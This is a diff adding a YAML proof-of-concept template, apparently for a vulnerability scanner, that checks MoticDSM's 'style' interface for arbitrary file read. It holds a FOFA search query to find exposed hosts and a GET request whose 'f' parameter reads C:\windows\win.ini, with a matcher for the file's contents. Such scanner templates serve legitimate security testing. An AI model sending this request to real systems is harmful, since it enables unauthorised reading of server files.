@@ -1,0 +1,15 @@
+id: poc-yaml-moticdsm-style-readfile
+info:
+  name: MoticDSM style接口存在任意文件读取
+  severity: high
+  tags:
+  - 文件读取
+  finger: MoticDSM
+  fofa: body="API/File/GetNoUploadedFiles"
+requests:
+- method: GET
+  path: /UploadService/Page/style?f=C:\\windows\win.ini
+  expression: "status_code == 200 &&\ncontains(body, \"bit app support\") && \ncontains(body,\"\
+    fonts\") &&\ncontains(body,\"extensions\")\n"
+variables: {}
+transport: http
